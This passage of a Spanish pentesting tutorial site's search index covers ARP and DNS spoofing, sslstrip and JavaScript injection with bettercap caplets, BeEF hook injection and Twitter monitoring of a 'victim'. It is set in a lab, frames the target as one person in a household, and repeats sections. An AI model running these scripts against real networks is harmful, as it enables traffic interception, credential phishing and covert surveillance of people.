monitoreando la cuenta de la victima para conocer sus publicaciones, con estas publicaciones podremos obtener informaci\u00f3n como horarios de salida, dispositivos que utiliza entre otras. En escenarios mas complejos, podemos utilizar librerias de procesamiento de lenguaje natural (NTPL) entre otras para poder extraer la m\u00e1xima informaci\u00f3n posible, sin embargo, para este ejemplo las obviaremos. Script monitorizaci\u00f3n Twitter","title":"Obteniendo informaci\u00f3n de Twitter: tweepy"},{"location":"introduccion/","text":"Introducci\u00f3n \u00bfCu\u00e1l es el objetivo del la presentaci\u00f3n? El objetivo es enumerar las posibles vulnerabilidades que podemos apreciar en un hogar corriente. Se planetea un escenario en el cu\u00e1l se prentende recolectar informaci\u00f3n de un usuario concreto dentro de un n\u00facleo familiar. \u00bfQu\u00e9 contenido encontramos en esta p\u00e1gina? Los ataques que se mencionan en la presentaci\u00f3n en mayor profundidad. Se mostrar\u00e1n como hacerlos de forma manual as\u00ed como las herramientas existentes para automatizarlos, sin olvidar la parte de detecci\u00f3n de dichos ataques en una red local. Material usado durante la presentaci\u00f3n M\u00e1quinas virtuales Kali Linux o BlackArch como sistemas atacantes Sistemas Windows 10 como sistema v\u00edctima Routers gen\u00e9ricos de diferentes compa\u00f1ias Antenas Wifi Raspberry pi 3","title":"Introducci\u00f3n"},{"location":"introduccion/#introduccion","text":"","title":"Introducci\u00f3n"},{"location":"introduccion/#cual-es-el-objetivo-del-la-presentacion","text":"El objetivo es enumerar las posibles vulnerabilidades que podemos apreciar en un hogar corriente. Se planetea un escenario en el cu\u00e1l se prentende recolectar informaci\u00f3n de un usuario concreto dentro de un n\u00facleo familiar.","title":"\u00bfCu\u00e1l es el objetivo del la presentaci\u00f3n?"},{"location":"introduccion/#que-contenido-encontramos-en-esta-pagina","text":"Los ataques que se mencionan en la presentaci\u00f3n en mayor profundidad. Se mostrar\u00e1n como hacerlos de forma manual as\u00ed como las herramientas existentes para automatizarlos, sin olvidar la parte de detecci\u00f3n de dichos ataques en una red local.","title":"\u00bfQu\u00e9 contenido encontramos en esta p\u00e1gina?"},{"location":"introduccion/#material-usado-durante-la-presentacion","text":"M\u00e1quinas virtuales Kali Linux o BlackArch como sistemas atacantes Sistemas Windows 10 como sistema v\u00edctima Routers gen\u00e9ricos de diferentes compa\u00f1ias Antenas Wifi Raspberry pi 3","title":"Material usado durante la presentaci\u00f3n"},{"location":"javascript/","text":"POC: Inyectar Javascript malicioso Javascript es un lenguaje de programaci\u00f3n utilizado en programaci\u00f3n web que se ejecuta de lado del cliente, es decir, cualquier acci\u00f3n realizada en Javascript tendr\u00e1 un reflejo en los equipos de aquellas personas que visiten la p\u00e1gina web. Aprovechando esta caracter\u00edsitca de Javascript podemos inyectar un fichero Javascript (que contiene c\u00f3digo malicioso) dentro de las peticiones HTTP para poder realizar diferentes acciones ( como minar criptomonedas ) Inyecci\u00f3n de Javascript Para poder inyectar Javascript dentro de las peticiones, tendremos que realizar un ataque de arp spoofing, de forma que podemos realizar tratamiento de dichos paquetes. Posteiormente lo que tenemos que realizar es montar un proxy http/https, de forma que todas las peticiones de nuestro objetivo pasen por este y queden infectadas. Para poder modificar las peticiones usaremos el proxy http de bettercap. En primer lugar usaremos un c\u00f3digo Javascript de ejemplo. function onLoad(){ log(\"Script loaded..\"); } function onResponse(req,res){ if (res.ContentType.indexOf('text/html') == 0){ var body = res.ReadBody(); res.Body = body.replace( '</head>', '<script type=\"text/javascript\">alert(\\\"@cyberh99 wa s here\\\")</script></head>' ); } } injectionJS.js Este c\u00f3digo Javascript realiza una acci\u00f3n muy sencilla, se encarga de reemplarar la etiqueta head del c\u00f3digo html de cualquier p\u00e1gina agregando una sencilla ventana que dice \"@cyberh99 was here\". Con esto podemos comprobar como funcionala inyecci\u00f3n de Javascript. Dentro del c\u00f3digo encontramos dos funciones, las cuales tienen que estar para el funcionamiento del script , estas tienen la siguiente relevancia: onLoad() --> Se ejecuta cuando el script se cargca onResponse(req,res) --> Se ejecuta una vez se env\u00eda el paquete al servidor real y se recibe respuesta Una vez que tenemos el c\u00f3digo Javascript malicioso simplemente crearemos nuestro caplet para ejecutar Bettercap: set http.proxy.script injectionJS.js set https.proxy.script injectionJS.js set http.proxy.sslstrip true set https.proxy.sslstrip true http.proxy on https.proxy on injectionTest.cap Beef: Browser Explotation Framework El c\u00f3digo Javascript que hemos inyectado es muy simple, para una mera demostraci\u00f3n, sin embargo, podemos hacer cosas mucho m\u00e1s complejas, un ejemplo de ello es Beef. Beef (Browser Explotation Framework) es una herramienta que nos ofrece la opci\u00f3n de infectar diferentes navegadores con c\u00f3digo javascript, de forma que podamos realizar acciones sobre la m\u00e1quina infectada. Este framework puede estar conectado con Metasploit o ser utilizado para ingenieria social. Para poder inyectar el c\u00f3dgio javascript de beef utilizaremos el siguiente c\u00f3digo: function onLoad() { log( \"BeefInject loaded.\" ); log(\"targets: \" + env['arp.spoof.targets']); } function onResponse(req, res) { if( res.ContentType.indexOf('text/html') == 0 ){ var body = res.ReadBody(); if( body.indexOf('</head>') != -1 ) { res.Body = body.replace( '</head>', '<script type=\"text/javascript\" src=\"http://10.0.2.15:3000/hook.js\"></script></head>' ); } } } beefJavascript.js set http.proxy.script beefJavascript.js set https.proxy.script beefJavascript.js set http.proxy.sslstrip true set https.proxy.sslstrip true http.proxy on https.proxy on beefInjection.cap Posteriormente disponemos de todo el potencial que nos ofrece beef para realizar acciones de post explotaci\u00f3n.","title":"POC: Inyectando Javscript Malicioso"},{"location":"javascript/#poc-inyectar-javascript-malicioso","text":"Javascript es un lenguaje de programaci\u00f3n utilizado en programaci\u00f3n web que se ejecuta de lado del cliente, es decir, cualquier acci\u00f3n realizada en Javascript tendr\u00e1 un reflejo en los equipos de aquellas personas que visiten la p\u00e1gina web. Aprovechando esta caracter\u00edsitca de Javascript podemos inyectar un fichero Javascript (que contiene c\u00f3digo malicioso) dentro de las peticiones HTTP para poder realizar diferentes acciones ( como minar criptomonedas )","title":"POC: Inyectar Javascript malicioso"},{"location":"javascript/#inyeccion-de-javascript","text":"Para poder inyectar Javascript dentro de las peticiones, tendremos que realizar un ataque de arp spoofing, de forma que podemos realizar tratamiento de dichos paquetes. Posteiormente lo que tenemos que realizar es montar un proxy http/https, de forma que todas las peticiones de nuestro objetivo pasen por este y queden infectadas. Para poder modificar las peticiones usaremos el proxy http de bettercap. En primer lugar usaremos un c\u00f3digo Javascript de ejemplo. function onLoad(){ log(\"Script loaded..\"); } function onResponse(req,res){ if (res.ContentType.indexOf('text/html') == 0){ var body = res.ReadBody(); res.Body = body.replace( '</head>', '<script type=\"text/javascript\">alert(\\\"@cyberh99 wa s here\\\")</script></head>' ); } } injectionJS.js Este c\u00f3digo Javascript realiza una acci\u00f3n muy sencilla, se encarga de reemplarar la etiqueta head del c\u00f3digo html de cualquier p\u00e1gina agregando una sencilla ventana que dice \"@cyberh99 was here\". Con esto podemos comprobar como funcionala inyecci\u00f3n de Javascript. Dentro del c\u00f3digo encontramos dos funciones, las cuales tienen que estar para el funcionamiento del script , estas tienen la siguiente relevancia: onLoad() --> Se ejecuta cuando el script se cargca onResponse(req,res) --> Se ejecuta una vez se env\u00eda el paquete al servidor real y se recibe respuesta Una vez que tenemos el c\u00f3digo Javascript malicioso simplemente crearemos nuestro caplet para ejecutar Bettercap: set http.proxy.script injectionJS.js set https.proxy.script injectionJS.js set http.proxy.sslstrip true set https.proxy.sslstrip true http.proxy on https.proxy on injectionTest.cap","title":"Inyecci\u00f3n de Javascript"},{"location":"javascript/#beef-browser-explotation-framework","text":"El c\u00f3digo Javascript que hemos inyectado es muy simple, para una mera demostraci\u00f3n, sin embargo, podemos hacer cosas mucho m\u00e1s complejas, un ejemplo de ello es Beef. Beef (Browser Explotation Framework) es una herramienta que nos ofrece la opci\u00f3n de infectar diferentes navegadores con c\u00f3digo javascript, de forma que podamos realizar acciones sobre la m\u00e1quina infectada. Este framework puede estar conectado con Metasploit o ser utilizado para ingenieria social. Para poder inyectar el c\u00f3dgio javascript de beef utilizaremos el siguiente c\u00f3digo: function onLoad() { log( \"BeefInject loaded.\" ); log(\"targets: \" + env['arp.spoof.targets']); } function onResponse(req, res) { if( res.ContentType.indexOf('text/html') == 0 ){ var body = res.ReadBody(); if( body.indexOf('</head>') != -1 ) { res.Body = body.replace( '</head>', '<script type=\"text/javascript\" src=\"http://10.0.2.15:3000/hook.js\"></script></head>' ); } } } beefJavascript.js set http.proxy.script beefJavascript.js set https.proxy.script beefJavascript.js set http.proxy.sslstrip true set https.proxy.sslstrip true http.proxy on https.proxy on beefInjection.cap Posteriormente disponemos de todo el potencial que nos ofrece beef para realizar acciones de post explotaci\u00f3n.","title":"Beef: Browser Explotation Framework"},{"location":"networkAttack/","text":"Ataques en la red interna Una vez que estamos dentro de la red wifi, nos encontramos ante un escenario totalmente diferente al anterior. Tenemos que realizar descubrimiento de equipos, comprobar configuraciones por defecto, explorar vulnerabilidades del hardware de red, entre una larga lista de tareas. Dicho esto comencemos por el primer paso: descubrimiento de objetivos Descubrimiento de dispositivos Teniendo en cuanta las caracter\u00edsticas est\u00e1ndar de una red cuyo hardware de red est\u00e1 suministado por el ISP (Internet Service Provider) y asumiendo configuraciones por defecto existir\u00e1 un servidor DHCP (Dynamic Host Configuration Protocol) el cual autom\u00e1ticamente nos asignir\u00e1 los datos necesarios para tener acceso a internet. Al obtener una direcci\u00f3n ip autom\u00e1ticamente (como consecuencia del servidor DHCP), podremos tener cierta idea del tipo de red en el que estamos trabajando y en consecuncia realizar un escaneo de los dispositivos existentes. El primer paso ser\u00eda obtener determinada informaci\u00f3n de la red, para ello podemos utilizar las herramientas que nos proporiciona nuestro sistema GNU/Linux, concretamente route $ route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default 10.0.2.1 0.0.0.0 UG 100 0 0 wlan0 10.0.2.0 0.0.0.0 255.255.255.0 U 100 0 0 wlan0 Generalmente el comando route nos mostrar\u00e1 algo similar a lo anterior. Dentro de esta salida nos permite obtener cierta informaci\u00f3n: Puerta de enlace (Gateway): Esta direcci\u00f3n nos permitir\u00e1 saber mediante que dispositivo estamos saliendo a Internet M\u00e1scara de red: Nos permitir\u00e1 determinar en que tipo de red estamos trabajando (Tipo A,B,C) Esta informaci\u00f3n nos permitir\u00e1 posteriormente realizar un escaneo de la red en busca de dispositivos. Protocolo ARP Para realizar el descubrimiento de los equipos disponibles en la red usaremos la herramienta nmap puesto que nos permite obtener gran cantidad de informaci\u00f3n dentro de una red. En primer lugar, realizaremos un escaneo ARP (debido a su velocidad) para enumerar los dispositivos existentes: $ nmap -sn 10.0.2.0/24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-09 18:55 CET Nmap scan report for 10.0.2.1 Host is up (0.00032s latency). MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC) Nmap scan report for 10.0.2.2 Host is up (0.00019s latency). MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC) Nmap scan report for 10.0.2.3 Host is up (0.00020s latency). MAC Address: 08:00:27:8B:3F:6E (Oracle VirtualBox virtual NIC) Nmap scan report for 10.0.2.15 Host is up (0.00039s latency). MAC Address: 08:00:27:7E:F5:47 (Oracle VirtualBox virtual NIC) Nmap scan report for 10.0.2.4 Host is up. Nmap done: 256 IP addresses (5 hosts up) scanned in 7.61 seconds El protocolo ARP (Address Resolution Protocol) es un protoclo que trabaja en la capa 2 de la pila TCP/IP , este protocolo permite traducir las direcciones f\u00edsicas (MAC) en direcciones l\u00f3gicas (IP) que identifiquen nuestros dispositivos. Este traducci\u00f3n de direcciones es necesaria para operar posteriormente. Esta informaci\u00f3n queda almacenada en nuestro sistema, de forma que podemos consultarla en cualquier momento haciendo uso de la herramienta arp $ arp -e Address HWtype HWaddress Flags Mask Iface 10.0.2.1 ether 52:54:00:12:35:00 C wlan0 10.0.2.15 ether 08:00:27:7e:f5:47 C wlan0 Como podemos ver podemos consultar las direcciones f\u00edsicas (HWaddress), relacionadas con cada direcci\u00f3n IP (Address). La informaci\u00f3n almacenada en esta tabla es esencial, puesto que cuando queremos enviar datos (paquetes) entre diferentes m\u00e1quinas (nustra m\u00e1quina local y un servidor web), se realizar\u00e1 mediante la direcci\u00f3n f\u00edsica, por lo que el sistema operativo consultar\u00e1 los datos almacenados en esta tabla. \u00bfQu\u00e9 sucede si no esta la direcci\u00f3n en la tabla ARP? Cuando no encontramos una direcci\u00f3n en la tabla ARP, el sistema operativo envia un paquete ARP request preguntando Who has 10.0.2.15? hacia una direcci\u00f3n en concreto (direcci\u00f3n de broadcast), esto puede observarse examinando un paquete tipo request con Wirehark: Como podemos ver la direcci\u00f3n de destino del paquete es la direcci\u00f3n de broadcast (ff:ff:ff:ff:ff:ff). Por parte del protocolo ARP, se env\u00eda la siguiente informaci\u00f3n. Como se puede observar se indica la direcci\u00f3n ip destino, la direcci\u00f3n que queremos descubrir en la red. En caso de que dicha direcci\u00f3n exista, tendr\u00e1 una direcci\u00f3n MAC asociada, por lo cual el protolo ARP recibir\u00e1 respuesta con un paquete ARP tipo reply donde se encuentra la direcci\u00f3n f\u00edsica del dispositivo. Si la direcci\u00f3n ip a la cual estamos enviando el paquete request no se encuentra en la red, no obtenedremos respuesta por parte del protocolo ARP. Ententiendo como funciona el protocolo ARP, ser\u00eda muy f\u00e1cil llegar a la conclusi\u00f3n de que si enviamos paquetes a todas las direcciones posibles dentro de nuestra m\u00e1scara de red, solo aquellas peticiones que tengan respuesta har\u00e1n referencia a los dispositivos existentes en la red. Problemas del escaneo ARP El principal problema que plantea un escaneo de tipo ARP es que genera mucho ruido en la red, de forma que puede ser detectado facilmente por cualquier detector de intrusos. Sin embargo, en el escenario en el que estamos se supone que no existen dichos mecanismos. Como ejemplo del ruido generado en la red se deja a continuaci\u00f3n un paquete .pcapg Capturando tr\u00e1fico de red El siguiente paso a seguir cuando tenemos los objetivos descubiertos ser\u00eda identificar cual es el dispositivo que nos interesa y comenzar a capturar tr\u00e1fico del mismo. La finalidad de esta obtenci\u00f3n de tr\u00e1fico es conseguir informaci\u00f3n del objetivo, para posteriormente realizar ataques dirigidos. Capturando tr\u00e1fico de un dispositivo: ARP Spoofing Con los conocimientos explicados anteiormente sobre ARP, podemos entender perfectamente como funciona el ataque arp spoofing . Este ataque consiste en alterar la informaci\u00f3n almacenada en las tablas ARP del sistema, de forma que alteremos la direcci\u00f3n MAC del router para que apunte a nuestro equipo. Con esta modificaci\u00f3n pretendemos hacer que cualquier paquete que env\u00ede la v\u00edctima a internet, circule por nuestro equipo ( ya que nos encontramos entre su conexi\u00f3n y la del router), como consecuencia de dicha redirecci\u00f3n de paquetes podemos realizar cualquier an\u00e1lisis o modificaci\u00f3n de dicho paquete. Como podemos ver en el esquema, la v\u00edctima se pensar\u00e1 que la direcci\u00f3n f\u00edsica del router es la nuestra (por lo tanto los paquetes ser\u00e1n enviados a nuestro equipo), posteriormente nosotros redireccionaremos dichos paquetes al router (o switch) pertinente. El retraso de los paquetes causado por dicha redirecci\u00f3n es completamente irrelevante. Arp Spoofing en Linux Dentro de las diferentes distribuciones GNU/Linux tenemos diferentes herramientas para realizar ARP Spoofing, la m\u00e1s com\u00fan es arpspoof, sin embargo, existen aplicaciones m\u00e1s completas como ettercap o bettercap que nos permiten realizar tareas m\u00e1s complejas de forma sencilla, como veremos posteriormente. Para realizar un ataque arp spoofing, el primer paso es activar la redirecci\u00f3n de paquetes en nuestro equipo (para evitar as\u00ed que la v\u00edctima pierda conectividad de red), para ello simplemente modificamos el archivo /proc/sys/net/ipv4/ip_forward $ echo 1 > /proc/sys/net/ipv4/ip_forward Con esto tendremos activada la redirecci\u00f3n de paquetes de forma temporal, una vez realizado este paso simplemente tenemos que ejecutar el comando arpspoof con las direcciones de la v\u00edctima y el router. $ arpspoof -t 10.0.2.15 10.0.2.1 De esta forma estamos enviando de forma constante paquetes arp reply informando de que la direcci\u00f3n MAC correspondiente a 10.0.2.1 (el router), corresponde con la de nuestro dispositivo (10.0.2.15). Cuando la v\u00edctima pregunte cual es la direcci\u00f3n f\u00edsica de (10.0.2.1) se encontrar\u00e1 con los paquetes que estamos enviando y autom\u00e1ticamente guardar\u00e1 la nuestra. Llegados a este punto abriendo un sniffer podemos observar el tr\u00e1fico saliente de este dispositivo. Posteiormente podemos usar alguna herramienta como Wireshark para analizar el tr\u00e1fico. Ejemplo de captura de tr\u00e1fico hacia p\u00e1ginas con cifrado SSL SSL Capture.pcapng Modificando paquetes de red Capturar tr\u00e1fico saliente puede ser de gran ayuda para entender los protocolos que usa nuestro objetivo y en el caso de que se use un protocolo no seguro poder obtener credenciales que pueden ser reutilizadas, sin embargo, la mayoria de los protocolos que se utilizan suelen estar cifrados, es en este punto donde entra la modificaci\u00f3n de paquetes. Bettercap: The Swiss Army knife for 802.11 Bettercap es una herramienta que naci\u00f3 como evoluci\u00f3n de ettercap , de forma que nos permite implementar mayor n\u00famero de ataques facilitando mucho determindas labores (como la creaci\u00f3n de un proxy http manual). Podemos realizar m\u00faltiples acciones mediantes los denomidamos caplets . Los caplets son fichers .cap que contienen instrucciones de bettercap, de forma que podemos realizar diferentes acciones almacenandolas todas ellas en un simple fichero (para su posterior reutilizaci\u00f3n) DNS Spoofing Uno de los ataques que podemos realizar dentro de una red local consiste en la modificaci\u00f3n de las peticiones DNS para que apunten a diferentes sitios web. Este ataque nos permite realizar ataques de phishing y obtener credenciales o redirigir a la v\u00edctima hacia un sitio con malware. Para realizar un ataque de DNS spoofing con Bettercap, en primer lugar necesitamos crear un fichero con el formato hosts para indicar las p\u00e1ginas que queremos redireccionar. 10.0.2.15 google.com 10.0.2.15 facebook.com 10.0.2.15 uco.es hostsSpoofing De esta forma cualquier petici\u00f3n hacia estas direcciones ser\u00e1 automaticamente redirigida a nuestro servidor. Posteriormente tendremos que realizar el caplet para ejecutar con Bettercap. set dns.spoof.hotst ./hostsDns dns.spoof on dnsSpoofing.cap Por \u00faltimo ejecutamos bettercap: $ bettecap -caplet dns_spoofing.cap Previamente a relaizar este ataque tendremos que haber realizado un arp spoofing (para poder modificar los paquetes). Podemos incluir dicho ataque dentro del fichero dnsSpoofing.cap con las siguientes modificaciones arp.spoof.targets 10.0.2.15 arp.spoof on set dns.spoof.hotst ./hostsSpoofing dns.spoof on En el caso de que queramos realizar el ataque en todo el segmento en el que nos encotramo, podemos obviar el par\u00e1metro arp.spoof.targets","title":"Explorando la red interna"},{"location":"networkAttack/#ataques-en-la-red-interna","text":"Una vez que estamos dentro de la red wifi, nos encontramos ante un escenario totalmente diferente al anterior. Tenemos que realizar descubrimiento de equipos, comprobar configuraciones por defecto, explorar vulnerabilidades del hardware de red, entre una larga lista de tareas. Dicho esto comencemos por el primer paso: descubrimiento de objetivos","title":"Ataques en la red interna"},{"location":"networkAttack/#descubrimiento-de-dispositivos","text":"Teniendo en cuanta las caracter\u00edsticas est\u00e1ndar de una red cuyo hardware de red est\u00e1 suministado por el ISP (Internet Service Provider) y asumiendo configuraciones por defecto existir\u00e1 un servidor DHCP (Dynamic Host Configuration Protocol) el cual autom\u00e1ticamente nos asignir\u00e1 los datos necesarios para tener acceso a internet. Al obtener una direcci\u00f3n ip autom\u00e1ticamente (como consecuencia del servidor DHCP), podremos tener cierta idea del tipo de red en el que estamos trabajando y en consecuncia realizar un escaneo de los dispositivos existentes. El primer paso ser\u00eda obtener determinada informaci\u00f3n de la red, para ello podemos utilizar las herramientas que nos proporiciona nuestro sistema GNU/Linux, concretamente route $ route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default 10.0.2.1 0.0.0.0 UG 100 0 0 wlan0 10.0.2.0 0.0.0.0 255.255.255.0 U 100 0 0 wlan0 Generalmente el comando route nos mostrar\u00e1 algo similar a lo anterior. Dentro de esta salida nos permite obtener cierta informaci\u00f3n: Puerta de enlace (Gateway): Esta direcci\u00f3n nos permitir\u00e1 saber mediante que dispositivo estamos saliendo a Internet M\u00e1scara de red: Nos permitir\u00e1 determinar en que tipo de red estamos trabajando (Tipo A,B,C) Esta informaci\u00f3n nos permitir\u00e1 posteriormente realizar un escaneo de la red en busca de dispositivos.","title":"Descubrimiento de dispositivos"},{"location":"networkAttack/#protocolo-arp","text":"Para realizar el descubrimiento de los equipos disponibles en la red usaremos la herramienta nmap puesto que nos permite obtener gran cantidad de informaci\u00f3n dentro de una red. En primer lugar, realizaremos un escaneo ARP (debido a su velocidad) para enumerar los dispositivos existentes: $ nmap -sn 10.0.2.0/24 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-09 18:55 CET Nmap scan report for 10.0.2.1 Host is up (0.00032s latency). MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC) Nmap scan report for 10.0.2.2 Host is up (0.00019s latency). MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC) Nmap scan report for 10.0.2.3 Host is up (0.00020s latency). MAC Address: 08:00:27:8B:3F:6E (Oracle VirtualBox virtual NIC) Nmap scan report for 10.0.2.15 Host is up (0.00039s latency). MAC Address: 08:00:27:7E:F5:47 (Oracle VirtualBox virtual NIC) Nmap scan report for 10.0.2.4 Host is up. Nmap done: 256 IP addresses (5 hosts up) scanned in 7.61 seconds El protocolo ARP (Address Resolution Protocol) es un protoclo que trabaja en la capa 2 de la pila TCP/IP , este protocolo permite traducir las direcciones f\u00edsicas (MAC) en direcciones l\u00f3gicas (IP) que identifiquen nuestros dispositivos. Este traducci\u00f3n de direcciones es necesaria para operar posteriormente. Esta informaci\u00f3n queda almacenada en nuestro sistema, de forma que podemos consultarla en cualquier momento haciendo uso de la herramienta arp $ arp -e Address HWtype HWaddress Flags Mask Iface 10.0.2.1 ether 52:54:00:12:35:00 C wlan0 10.0.2.15 ether 08:00:27:7e:f5:47 C wlan0 Como podemos ver podemos consultar las direcciones f\u00edsicas (HWaddress), relacionadas con cada direcci\u00f3n IP (Address). La informaci\u00f3n almacenada en esta tabla es esencial, puesto que cuando queremos enviar datos (paquetes) entre diferentes m\u00e1quinas (nustra m\u00e1quina local y un servidor web), se realizar\u00e1 mediante la direcci\u00f3n f\u00edsica, por lo que el sistema operativo consultar\u00e1 los datos almacenados en esta tabla.","title":"Protocolo ARP"},{"location":"networkAttack/#que-sucede-si-no-esta-la-direccion-en-la-tabla-arp","text":"Cuando no encontramos una direcci\u00f3n en la tabla ARP, el sistema operativo envia un paquete ARP request preguntando Who has 10.0.2.15? hacia una direcci\u00f3n en concreto (direcci\u00f3n de broadcast), esto puede observarse examinando un paquete tipo request con Wirehark: Como podemos ver la direcci\u00f3n de destino del paquete es la direcci\u00f3n de broadcast (ff:ff:ff:ff:ff:ff). Por parte del protocolo ARP, se env\u00eda la siguiente informaci\u00f3n. Como se puede observar se indica la direcci\u00f3n ip destino, la direcci\u00f3n que queremos descubrir en la red. En caso de que dicha direcci\u00f3n exista, tendr\u00e1 una direcci\u00f3n MAC asociada, por lo cual el protolo ARP recibir\u00e1 respuesta con un paquete ARP tipo reply donde se encuentra la direcci\u00f3n f\u00edsica del dispositivo. Si la direcci\u00f3n ip a la cual estamos enviando el paquete request no se encuentra en la red, no obtenedremos respuesta por parte del protocolo ARP. Ententiendo como funciona el protocolo ARP, ser\u00eda muy f\u00e1cil llegar a la conclusi\u00f3n de que si enviamos paquetes a todas las direcciones posibles dentro de nuestra m\u00e1scara de red, solo aquellas peticiones que tengan respuesta har\u00e1n referencia a los dispositivos existentes en la red.","title":"\u00bfQu\u00e9 sucede si no esta la direcci\u00f3n en la tabla ARP?"},{"location":"networkAttack/#problemas-del-escaneo-arp","text":"El principal problema que plantea un escaneo de tipo ARP es que genera mucho ruido en la red, de forma que puede ser detectado facilmente por cualquier detector de intrusos. Sin embargo, en el escenario en el que estamos se supone que no existen dichos mecanismos. Como ejemplo del ruido generado en la red se deja a continuaci\u00f3n un paquete .pcapg","title":"Problemas del escaneo ARP"},{"location":"networkAttack/#capturando-trafico-de-red","text":"El siguiente paso a seguir cuando tenemos los objetivos descubiertos ser\u00eda identificar cual es el dispositivo que nos interesa y comenzar a capturar tr\u00e1fico del mismo. La finalidad de esta obtenci\u00f3n de tr\u00e1fico es conseguir informaci\u00f3n del objetivo, para posteriormente realizar ataques dirigidos.","title":"Capturando  tr\u00e1fico de red"},{"location":"networkAttack/#capturando-trafico-de-un-dispositivo-arp-spoofing","text":"Con los conocimientos explicados anteiormente sobre ARP, podemos entender perfectamente como funciona el ataque arp spoofing . Este ataque consiste en alterar la informaci\u00f3n almacenada en las tablas ARP del sistema, de forma que alteremos la direcci\u00f3n MAC del router para que apunte a nuestro equipo. Con esta modificaci\u00f3n pretendemos hacer que cualquier paquete que env\u00ede la v\u00edctima a internet, circule por nuestro equipo ( ya que nos encontramos entre su conexi\u00f3n y la del router), como consecuencia de dicha redirecci\u00f3n de paquetes podemos realizar cualquier an\u00e1lisis o modificaci\u00f3n de dicho paquete. Como podemos ver en el esquema, la v\u00edctima se pensar\u00e1 que la direcci\u00f3n f\u00edsica del router es la nuestra (por lo tanto los paquetes ser\u00e1n enviados a nuestro equipo), posteriormente nosotros redireccionaremos dichos paquetes al router (o switch) pertinente. El retraso de los paquetes causado por dicha redirecci\u00f3n es completamente irrelevante.","title":"Capturando tr\u00e1fico de un dispositivo: ARP Spoofing"},{"location":"networkAttack/#arp-spoofing-en-linux","text":"Dentro de las diferentes distribuciones GNU/Linux tenemos diferentes herramientas para realizar ARP Spoofing, la m\u00e1s com\u00fan es arpspoof, sin embargo, existen aplicaciones m\u00e1s completas como ettercap o bettercap que nos permiten realizar tareas m\u00e1s complejas de forma sencilla, como veremos posteriormente. Para realizar un ataque arp spoofing, el primer paso es activar la redirecci\u00f3n de paquetes en nuestro equipo (para evitar as\u00ed que la v\u00edctima pierda conectividad de red), para ello simplemente modificamos el archivo /proc/sys/net/ipv4/ip_forward $ echo 1 > /proc/sys/net/ipv4/ip_forward Con esto tendremos activada la redirecci\u00f3n de paquetes de forma temporal, una vez realizado este paso simplemente tenemos que ejecutar el comando arpspoof con las direcciones de la v\u00edctima y el router. $ arpspoof -t 10.0.2.15 10.0.2.1 De esta forma estamos enviando de forma constante paquetes arp reply informando de que la direcci\u00f3n MAC correspondiente a 10.0.2.1 (el router), corresponde con la de nuestro dispositivo (10.0.2.15). Cuando la v\u00edctima pregunte cual es la direcci\u00f3n f\u00edsica de (10.0.2.1) se encontrar\u00e1 con los paquetes que estamos enviando y autom\u00e1ticamente guardar\u00e1 la nuestra. Llegados a este punto abriendo un sniffer podemos observar el tr\u00e1fico saliente de este dispositivo. Posteiormente podemos usar alguna herramienta como Wireshark para analizar el tr\u00e1fico. Ejemplo de captura de tr\u00e1fico hacia p\u00e1ginas con cifrado SSL SSL Capture.pcapng","title":"Arp Spoofing en Linux"},{"location":"networkAttack/#modificando-paquetes-de-red","text":"Capturar tr\u00e1fico saliente puede ser de gran ayuda para entender los protocolos que usa nuestro objetivo y en el caso de que se use un protocolo no seguro poder obtener credenciales que pueden ser reutilizadas, sin embargo, la mayoria de los protocolos que se utilizan suelen estar cifrados, es en este punto donde entra la modificaci\u00f3n de paquetes.","title":"Modificando paquetes de red"},{"location":"networkAttack/#bettercap-the-swiss-army-knife-for-80211","text":"Bettercap es una herramienta que naci\u00f3 como evoluci\u00f3n de ettercap , de forma que nos permite implementar mayor n\u00famero de ataques facilitando mucho determindas labores (como la creaci\u00f3n de un proxy http manual). Podemos realizar m\u00faltiples acciones mediantes los denomidamos caplets . Los caplets son fichers .cap que contienen instrucciones de bettercap, de forma que podemos realizar diferentes acciones almacenandolas todas ellas en un simple fichero (para su posterior reutilizaci\u00f3n)","title":"Bettercap: The Swiss Army knife for 802.11"},{"location":"networkAttack/#dns-spoofing","text":"Uno de los ataques que podemos realizar dentro de una red local consiste en la modificaci\u00f3n de las peticiones DNS para que apunten a diferentes sitios web. Este ataque nos permite realizar ataques de phishing y obtener credenciales o redirigir a la v\u00edctima hacia un sitio con malware. Para realizar un ataque de DNS spoofing con Bettercap, en primer lugar necesitamos crear un fichero con el formato hosts para indicar las p\u00e1ginas que queremos redireccionar. 10.0.2.15 google.com 10.0.2.15 facebook.com 10.0.2.15 uco.es hostsSpoofing De esta forma cualquier petici\u00f3n hacia estas direcciones ser\u00e1 automaticamente redirigida a nuestro servidor. Posteriormente tendremos que realizar el caplet para ejecutar con Bettercap. set dns.spoof.hotst ./hostsDns dns.spoof on dnsSpoofing.cap Por \u00faltimo ejecutamos bettercap: $ bettecap -caplet dns_spoofing.cap Previamente a relaizar este ataque tendremos que haber realizado un arp spoofing (para poder modificar los paquetes). Podemos incluir dicho ataque dentro del fichero dnsSpoofing.cap con las siguientes modificaciones arp.spoof.targets 10.0.2.15 arp.spoof on set dns.spoof.hotst ./hostsSpoofing dns.spoof on En el caso de que queramos realizar el ataque en todo el segmento en el que nos encotramo, podemos obviar el par\u00e1metro arp.spoof.targets","title":"DNS Spoofing"},{"location":"raspberry/","text":"Preparando el arsenal Configurando la Raspberry PI como herramienta de hacking \u00bfQu\u00e9 es una Raspberry? El proyecto Raspberry Pi consiste en una serie de ordenadores cuyo principal objetivo era potencial el aprendizaje en entornos educativos as\u00ed como en paises en vias de desarrollo, sin embargo, gracias al potencial de estos equipos se utilizan para otros muchos fines como rob\u00f3tica o en nuestro caso pentesting. \u00bfCu\u00e1les son las caracter\u00edsticas que tiene? Procesador a 1,2 GHz de 64 bits con cuatro n\u00facleos ARMv8. 1GB de Memoria. 802.11n Wireless LAN. Bluetooth 4.1. Bluetooth Low Energy (BLE). 4 puertos USB. 40 pines GPIO. Puerto Full HDMI. Puerto Ethernet. Conector combo compuesto de audio y v\u00eddeo de 3,5 mm. Interfaz de la c\u00e1mara (CSI). Interfaz de pantalla (DSI). Ranura para tarjetas microSD (ahora push-pull en lugar de push-push). N\u00facleo de gr\u00e1ficos 